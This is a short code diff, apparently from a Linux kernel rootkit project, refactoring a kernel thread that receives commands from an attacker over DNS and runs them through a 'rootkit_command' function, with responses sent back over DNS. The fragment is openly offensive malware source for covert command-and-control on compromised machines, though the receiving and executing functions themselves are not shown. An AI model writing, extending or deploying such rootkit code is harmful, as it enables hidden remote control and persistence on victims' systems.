@@ -1,7 +1,6 @@
 #include "hide_api.h"
 #include "network.h"
 
-bool response_over_dns = false;
 static struct task_struct *dns_worker_thread = NULL;
 
 /**
@@ -21,12 +20,9 @@ static int dns_worker(void *data) {
     while (!kthread_should_stop()) {
         int len = dns_receive_command(cmd_buf, sizeof(cmd_buf));
         if (len > 0) {
-            DBG_MSG("dns_worker: got commmand from attacker '%s'\n", cmd_buf);
-
             // Send the response of command over DNS
-            response_over_dns = true;
-            rootkit_command(cmd_buf, len + 1);
-            response_over_dns = false;
+            DBG_MSG("dns_worker: got commmand from attacker '%s'\n", cmd_buf);
+            rootkit_command(cmd_buf, len + 1, DNS);
         }
 
         // Sleep for a defined interval to avoid busy-waiting
